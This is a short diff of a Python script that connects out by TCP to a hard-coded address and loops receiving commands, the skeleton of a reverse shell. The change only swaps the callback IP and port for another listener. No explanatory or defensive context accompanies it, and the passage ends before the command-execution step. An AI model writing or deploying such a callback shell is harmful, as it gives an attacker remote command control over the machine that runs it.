@@ -1,7 +1,7 @@
 import socket
 import subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('10.10.0.102', 8877))
+s.connect(('192.168.1.13', 8888))
 
 while True:
 	command = s.recv(1024).decode()
